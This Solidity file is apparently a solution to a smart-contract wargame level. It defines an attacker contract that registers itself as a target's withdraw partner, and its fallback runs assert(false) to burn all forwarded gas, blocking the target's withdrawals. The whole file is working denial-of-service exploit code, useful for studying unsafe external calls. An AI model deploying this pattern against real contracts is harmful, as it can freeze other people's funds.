pragma solidity ^0.7.3;

contract DenialAttacker {
    Denial public denialContract;

    constructor(address denialContractAddress) {
        denialContract = Denial(denialContractAddress);
    }

    function attack() public {
        denialContract.setWithdrawPartner(address(this));
    }

    fallback() external payable {
        // assert consumes all (!) gas
        assert(false);

        // the others don't
        // revert("revert");
        // require(false, "require");
    }
}
